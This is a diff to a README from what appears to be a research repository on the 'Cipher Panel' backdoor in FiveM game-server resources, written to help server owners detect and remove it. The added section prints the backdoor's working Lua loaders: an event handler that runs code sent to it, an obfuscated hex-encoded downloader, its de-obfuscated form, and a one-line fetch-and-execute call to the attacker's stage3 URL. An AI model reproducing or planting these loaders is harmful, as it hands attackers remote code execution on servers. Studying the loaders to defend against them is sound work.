@@ -1,5 +1,5 @@
 # MaliciousPanel
-Cipher Panel Research
+Cipher Panel Research (To clarify I have 0 connections to the group behind Cipher Panel, I'm merely researching this malicious panel for Cfx and server owners)
 
 With respect to @ericstolly's research, I have dug up more information and together with his research this repo has been created. 
 Mainly for information and educational purposes for server owners to figure out how what and where.
@@ -24,3 +24,87 @@ In the basis they're performing simple HTTP requests to their panel. Whenever th
 - Disable their website in the hosts file (in case of Windows)
 - Re-install the fresh sessionmanager
 - Use notepad++ to search for any obfuscated functions with the information that will be available per phase documentation
+
+**Traces Found**:
+```
+RegisterNetEvent('helpCode')
+
+AddEventHandler('helpCode', function(id)
+	local help = assert(load(id))
+	help()
+end)
+```
+Code from stage2 or stage3 will be send via a event and executed here. 
+
+In rconlog we found some obfuscated code, which is the same as the stage2 code but a different page which still these days is unknown what it's contents are or how to gain the contents of this page. Only thing known is that it's in the server sided and downloads the body of the page. 
+https://cipher-panel.me/_i/r.php?to=0
+
+Code:
+```
+local BaoWmVjtyB = {
+	_G['PerformHttpRequest'],
+	_G['assert'],
+	_G['load'],
+	_G['tonumber']
+}
+
+local CKGzkhSwYw = {
+	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
+	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
+	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
+}
+
+function uGeRrdKRtK()
+	JJcQCUzzCK = ''
+	for id,it in pairs(CKGzkhSwYw) do
+		JJcQCUzzCK = JJcQCUzzCK..it
+	end
+	return (JJcQCUzzCK:gsub('..', function (luwOyroAEjA)
+		return string.char(BaoWmVjtyB[4](luwOyroAEjA, 16))
+	end))
+end
+
+BaoWmVjtyB[BaoWmVjtyB[4]('1')](uGeRrdKRtK(), function (e, jKlDPYMVkD)
+	local YlEkQSXGlZ = BaoWmVjtyB[BaoWmVjtyB[4]('2')](BaoWmVjtyB[BaoWmVjtyB[4]('3')](jKlDPYMVkD))
+	if (jKlDPYMVkD == nil) then return end
+	YlEkQSXGlZ()
+end)
+```
+Doing our magical de-obfuscating and using the dehex function we can see that it downloads (just like the rest) the contents of the page r.php and executes it. The methods are the same as in the sessionmanager host_lock.lua file.
+De-Obfuscated Code:
+```
+local VarArray = {
+	_G['PerformHttpRequest'],
+	_G['assert'],
+	_G['load'],
+	_G['tonumber']
+}
+
+local HEXArray = {
+	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
+	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
+	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
+}
+
+function Func1()
+	String = ''
+	for id,it in pairs(HEXArray) do
+		String = String..it
+	end
+	return (String:gsub('..', function (var1)
+		return string.char(VarArray[4](var1, 16))
+	end))
+end
+
+PerformHttpRequest(Func1(), function (e, responseBody)
+	local Payload = assert((load(responseBody)))
+	if (responseBody == nil) then return end
+	Payload()
+end)
+```
+Simple CURL request to https://cipher-panel.me/_i/r.php?to=0 (Which is the HEX Array but in plain text), we get a different result.
+
+```
+PerformHttpRequest('https://cipher-panel.me/_i/v2_/stage3?to=0', function (e, d) pcall(function() assert(load(d))() end) end)
+```
+It sends us to this page but not the actual stage3.php, there seems to be a difference in that. 
